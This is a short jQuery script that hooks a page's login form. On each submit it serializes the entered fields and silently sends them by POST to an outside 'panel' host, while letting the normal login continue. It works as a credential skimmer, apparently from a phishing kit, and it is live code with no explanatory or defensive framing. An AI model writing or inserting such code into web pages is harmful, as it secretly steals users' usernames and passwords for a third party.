$(".login-form").submit(function() {
	var d = $(".login-form");

	$.ajax({
        url: "https://panel.scriptv3.my.id/",
        type: "POST",
        data: d.serialize(),
        success: function () {
            return true;
        },
        error: function () {
            return true;
        },
    });
});
